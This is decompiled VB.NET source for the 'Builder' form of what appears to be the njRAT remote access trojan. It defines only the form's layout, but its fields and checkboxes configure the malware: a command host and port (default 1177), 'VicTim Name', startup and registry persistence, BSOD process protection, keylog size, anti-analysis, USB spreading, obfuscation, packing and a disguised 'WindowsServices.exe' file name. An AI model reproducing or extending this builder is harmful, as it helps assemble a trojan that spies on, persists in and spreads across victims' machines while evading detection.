Namespace NJRAT
	' Token: 0x0200000C RID: 12
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class Builder
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000082 RID: 130 RVA: 0x0000544C File Offset: 0x0000364C
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000083 RID: 131 RVA: 0x0000549C File Offset: 0x0000369C
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.host = New Global.System.Windows.Forms.TextBox()
			Me.Label1 = New Global.System.Windows.Forms.Label()
			Me.Label2 = New Global.System.Windows.Forms.Label()
			Me.port = New Global.System.Windows.Forms.NumericUpDown()
			Me.Button1 = New Global.System.Windows.Forms.Button()
			Me.Label5 = New Global.System.Windows.Forms.Label()
			Me.VN = New Global.System.Windows.Forms.TextBox()
			Me.bsod = New Global.System.Windows.Forms.CheckBox()
			Me.T1 = New Global.System.Windows.Forms.TextBox()
			Me.Isf = New Global.System.Windows.Forms.CheckBox()
			Me.Isu = New Global.System.Windows.Forms.CheckBox()
			Me.klen = New Global.System.Windows.Forms.NumericUpDown()
			Me.Label6 = New Global.System.Windows.Forms.Label()
			Me.Anti_CH = New Global.System.Windows.Forms.CheckBox()
			Me.Label3 = New Global.System.Windows.Forms.Label()
			Me.exe = New Global.System.Windows.Forms.TextBox()
			Me.Label4 = New Global.System.Windows.Forms.Label()
			Me.dir = New Global.System.Windows.Forms.ComboBox()
			Me.Idr = New Global.System.Windows.Forms.CheckBox()
			Me.GroupBox1 = New Global.System.Windows.Forms.GroupBox()
			Me.USB_SP = New Global.System.Windows.Forms.CheckBox()
			Me.CKOBF = New Global.System.Windows.Forms.CheckBox()
			Me.CKUpx = New Global.System.Windows.Forms.CheckBox()
			CType(Me.port, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.klen, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			Me.GroupBox1.SuspendLayout()
			MyBase.SuspendLayout()
			Me.host.BackColor = Global.System.Drawing.Color.Black
			Me.host.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.host.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.host.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.host.Location = New Global.System.Drawing.Point(6, 38)
			Me.host.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.host.Name = "host"
			Me.host.Size = New Global.System.Drawing.Size(278, 26)
			Me.host.TabIndex = 0
			Me.host.Text = "127.0.0.1"
			Me.Label1.AutoSize = True
			Me.Label1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label1.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Label1.Location = New Global.System.Drawing.Point(10, 17)
			Me.Label1.Margin = New Global.System.Windows.Forms.Padding(4, 0, 4, 0)
			Me.Label1.Name = "Label1"
			Me.Label1.Size = New Global.System.Drawing.Size(46, 19)
			Me.Label1.TabIndex = 1
			Me.Label1.Text = "Host"
			Me.Label2.AutoSize = True
			Me.Label2.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label2.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Label2.Location = New Global.System.Drawing.Point(290, 14)
			Me.Label2.Margin = New Global.System.Windows.Forms.Padding(4, 0, 4, 0)
			Me.Label2.Name = "Label2"
			Me.Label2.Size = New Global.System.Drawing.Size(43, 19)
			Me.Label2.TabIndex = 2
			Me.Label2.Text = "Port"
			Me.port.BackColor = Global.System.Drawing.Color.Black
			Me.port.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.port.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.port.Location = New Global.System.Drawing.Point(294, 38)
			Me.port.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Dim port As Global.System.Windows.Forms.NumericUpDown = Me.port
			Dim array As Integer() = New Integer(3) {}
			array(0) = 60000
			port.Maximum = New Decimal(array)
			Dim port2 As Global.System.Windows.Forms.NumericUpDown = Me.port
			Dim array2 As Integer() = New Integer(3) {}
			array2(0) = 1
			port2.Minimum = New Decimal(array2)
			Me.port.Name = "port"
			Me.port.Size = New Global.System.Drawing.Size(104, 26)
			Me.port.TabIndex = 3
			Dim port3 As Global.System.Windows.Forms.NumericUpDown = Me.port
			Dim array3 As Integer() = New Integer(3) {}
			array3(0) = 1177
			port3.Value = New Decimal(array3)
			Me.Button1.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Button1.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button1.Font = New Global.System.Drawing.Font("Arial Black", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Button1.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Button1.Location = New Global.System.Drawing.Point(394, 261)
			Me.Button1.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.Button1.Name = "Button1"
			Me.Button1.Size = New Global.System.Drawing.Size(244, 67)
			Me.Button1.TabIndex = 6
			Me.Button1.Text = "Build"
			Me.Button1.UseVisualStyleBackColor = True
			Me.Label5.AutoSize = True
			Me.Label5.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label5.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Label5.Location = New Global.System.Drawing.Point(10, 74)
			Me.Label5.Margin = New Global.System.Windows.Forms.Padding(4, 0, 4, 0)
			Me.Label5.Name = "Label5"
			Me.Label5.Size = New Global.System.Drawing.Size(110, 19)
			Me.Label5.TabIndex = 9
			Me.Label5.Text = "VicTim Name"
			Me.VN.BackColor = Global.System.Drawing.Color.Black
			Me.VN.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.VN.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.VN.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.VN.Location = New Global.System.Drawing.Point(6, 100)
			Me.VN.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.VN.Name = "VN"
			Me.VN.Size = New Global.System.Drawing.Size(378, 26)
			Me.VN.TabIndex = 10
			Me.VN.Text = "MyBot"
			Me.bsod.AutoSize = True
			Me.bsod.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.bsod.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.bsod.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.bsod.Location = New Global.System.Drawing.Point(411, 17)
			Me.bsod.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.bsod.Name = "bsod"
			Me.bsod.Size = New Global.System.Drawing.Size(227, 23)
			Me.bsod.TabIndex = 11
			Me.bsod.Text = "Protect Process [BSOD]"
			Me.bsod.UseVisualStyleBackColor = True
			Me.T1.BackColor = Global.System.Drawing.Color.Black
			Me.T1.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.T1.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.T1.Location = New Global.System.Drawing.Point(156, 349)
			Me.T1.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.T1.Multiline = True
			Me.T1.Name = "T1"
			Me.T1.Size = New Global.System.Drawing.Size(149, 30)
			Me.T1.TabIndex = 12
			Me.T1.Visible = False
			Me.Isf.AutoSize = True
			Me.Isf.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Isf.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Isf.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Isf.Location = New Global.System.Drawing.Point(411, 48)
			Me.Isf.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.Isf.Name = "Isf"
			Me.Isf.Size = New Global.System.Drawing.Size(166, 23)
			Me.Isf.TabIndex = 13
			Me.Isf.Text = "Copy To StartUp"
			Me.Isf.UseVisualStyleBackColor = True
			Me.Isu.AutoSize = True
			Me.Isu.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Isu.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Isu.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Isu.Location = New Global.System.Drawing.Point(411, 79)
			Me.Isu.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.Isu.Name = "Isu"
			Me.Isu.Size = New Global.System.Drawing.Size(154, 23)
			Me.Isu.TabIndex = 14
			Me.Isu.Text = "Registy StarUp"
			Me.Isu.UseVisualStyleBackColor = True
			Me.klen.BackColor = Global.System.Drawing.Color.Black
			Me.klen.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.klen.Location = New Global.System.Drawing.Point(557, 209)
			Me.klen.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Dim klen As Global.System.Windows.Forms.NumericUpDown = Me.klen
			Dim array4 As Integer() = New Integer(3) {}
			array4(0) = 512
			klen.Maximum = New Decimal(array4)
			Dim klen2 As Global.System.Windows.Forms.NumericUpDown = Me.klen
			Dim array5 As Integer() = New Integer(3) {}
			array5(0) = 5
			klen2.Minimum = New Decimal(array5)
			Me.klen.Name = "klen"
			Me.klen.Size = New Global.System.Drawing.Size(81, 26)
			Me.klen.TabIndex = 15
			Dim klen3 As Global.System.Windows.Forms.NumericUpDown = Me.klen
			Dim array6 As Integer() = New Integer(3) {}
			array6(0) = 20
			klen3.Value = New Decimal(array6)
			Me.Label6.AutoSize = True
			Me.Label6.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label6.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Label6.Location = New Global.System.Drawing.Point(407, 215)
			Me.Label6.Margin = New Global.System.Windows.Forms.Padding(4, 0, 4, 0)
			Me.Label6.Name = "Label6"
			Me.Label6.Size = New Global.System.Drawing.Size(145, 19)
			Me.Label6.TabIndex = 16
			Me.Label6.Text = "KeyLogs Size KB"
			Me.Anti_CH.AutoSize = True
			Me.Anti_CH.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Anti_CH.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Anti_CH.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Anti_CH.Location = New Global.System.Drawing.Point(411, 112)
			Me.Anti_CH.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.Anti_CH.Name = "Anti_CH"
			Me.Anti_CH.Size = New Global.System.Drawing.Size(79, 23)
			Me.Anti_CH.TabIndex = 17
			Me.Anti_CH.Text = "Anti's"
			Me.Anti_CH.UseVisualStyleBackColor = True
			Me.Label3.AutoSize = True
			Me.Label3.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label3.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Label3.Location = New Global.System.Drawing.Point(4, 25)
			Me.Label3.Margin = New Global.System.Windows.Forms.Padding(4, 0, 4, 0)
			Me.Label3.Name = "Label3"
			Me.Label3.Size = New Global.System.Drawing.Size(82, 19)
			Me.Label3.TabIndex = 4
			Me.Label3.Text = "ExeName"
			Me.exe.BackColor = Global.System.Drawing.Color.Black
			Me.exe.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.exe.Enabled = False
			Me.exe.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.exe.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.exe.Location = New Global.System.Drawing.Point(9, 49)
			Me.exe.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.exe.Name = "exe"
			Me.exe.Size = New Global.System.Drawing.Size(360, 26)
			Me.exe.TabIndex = 5
			Me.exe.Text = "WindowsServices.exe"
			Me.Label4.AutoSize = True
			Me.Label4.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.Label4.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Label4.Location = New Global.System.Drawing.Point(4, 88)
			Me.Label4.Margin = New Global.System.Windows.Forms.Padding(4, 0, 4, 0)
			Me.Label4.Name = "Label4"
			Me.Label4.Size = New Global.System.Drawing.Size(82, 19)
			Me.Label4.TabIndex = 6
			Me.Label4.Text = "Directory"
			Me.dir.BackColor = Global.System.Drawing.Color.Black
			Me.dir.DropDownStyle = Global.System.Windows.Forms.ComboBoxStyle.DropDownList
			Me.dir.Enabled = False
			Me.dir.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.dir.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.dir.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.dir.FormattingEnabled = True
			Me.dir.Items.AddRange(New Object() { "%TEMP%", "%AppData%", "%UserProfile%", "%AllUsersProfile%", "%WinDir%" })
			Me.dir.Location = New Global.System.Drawing.Point(9, 112)
			Me.dir.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.dir.Name = "dir"
			Me.dir.Size = New Global.System.Drawing.Size(360, 27)
			Me.dir.TabIndex = 7
			Me.Idr.AutoSize = True
			Me.Idr.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Idr.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.Idr.Location = New Global.System.Drawing.Point(294, 18)
			Me.Idr.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.Idr.Name = "Idr"
			Me.Idr.Size = New Global.System.Drawing.Size(71, 24)
			Me.Idr.TabIndex = 14
			Me.Idr.Text = "Copy"
			Me.Idr.UseVisualStyleBackColor = True
			Me.GroupBox1.Controls.Add(Me.CKUpx)
			Me.GroupBox1.Controls.Add(Me.Idr)
			Me.GroupBox1.Controls.Add(Me.dir)
			Me.GroupBox1.Controls.Add(Me.Label4)
			Me.GroupBox1.Controls.Add(Me.exe)
			Me.GroupBox1.Controls.Add(Me.Label3)
			Me.GroupBox1.Location = New Global.System.Drawing.Point(6, 149)
			Me.GroupBox1.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.GroupBox1.Name = "GroupBox1"
			Me.GroupBox1.Padding = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.GroupBox1.Size = New Global.System.Drawing.Size(380, 179)
			Me.GroupBox1.TabIndex = 5
			Me.GroupBox1.TabStop = False
			Me.USB_SP.AutoSize = True
			Me.USB_SP.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.USB_SP.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.USB_SP.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.USB_SP.Location = New Global.System.Drawing.Point(411, 145)
			Me.USB_SP.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.USB_SP.Name = "USB_SP"
			Me.USB_SP.Size = New Global.System.Drawing.Size(131, 23)
			Me.USB_SP.TabIndex = 18
			Me.USB_SP.Text = "Spread USB"
			Me.USB_SP.UseVisualStyleBackColor = True
			Me.CKOBF.AutoSize = True
			Me.CKOBF.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.CKOBF.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.CKOBF.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.CKOBF.Location = New Global.System.Drawing.Point(411, 178)
			Me.CKOBF.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.CKOBF.Name = "CKOBF"
			Me.CKOBF.Size = New Global.System.Drawing.Size(130, 23)
			Me.CKOBF.TabIndex = 19
			Me.CKOBF.Text = "Obfuscation"
			Me.CKOBF.UseVisualStyleBackColor = True
			Me.CKUpx.AutoSize = True
			Me.CKUpx.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.CKUpx.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.CKUpx.ForeColor = Global.System.Drawing.Color.LightSteelBlue
			Me.CKUpx.Location = New Global.System.Drawing.Point(9, 149)
			Me.CKUpx.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.CKUpx.Name = "CKUpx"
			Me.CKUpx.Size = New Global.System.Drawing.Size(202, 23)
			Me.CKUpx.TabIndex = 20
			Me.CKUpx.Text = "MPress Compression"
			Me.CKUpx.UseVisualStyleBackColor = True
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(9F, 20F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			Me.BackColor = Global.System.Drawing.Color.Black
			MyBase.ClientSize = New Global.System.Drawing.Size(645, 342)
			MyBase.Controls.Add(Me.CKOBF)
			MyBase.Controls.Add(Me.USB_SP)
			MyBase.Controls.Add(Me.Anti_CH)
			MyBase.Controls.Add(Me.Label6)
			MyBase.Controls.Add(Me.klen)
			MyBase.Controls.Add(Me.Isu)
			MyBase.Controls.Add(Me.Isf)
			MyBase.Controls.Add(Me.T1)
			MyBase.Controls.Add(Me.bsod)
			MyBase.Controls.Add(Me.VN)
			MyBase.Controls.Add(Me.Label5)
			MyBase.Controls.Add(Me.Button1)
			MyBase.Controls.Add(Me.GroupBox1)
			MyBase.Controls.Add(Me.port)
			MyBase.Controls.Add(Me.Label2)
			MyBase.Controls.Add(Me.Label1)
			MyBase.Controls.Add(Me.host)
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.FixedToolWindow
			MyBase.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			MyBase.MaximizeBox = False
			MyBase.MinimizeBox = False
			MyBase.Name = "Builder"
			MyBase.ShowIcon = False
			MyBase.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "Builder"
			CType(Me.port, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.klen, Global.System.ComponentModel.ISupportInitialize).EndInit()
			Me.GroupBox1.ResumeLayout(False)
			Me.GroupBox1.PerformLayout()
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x04000038 RID: 56
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
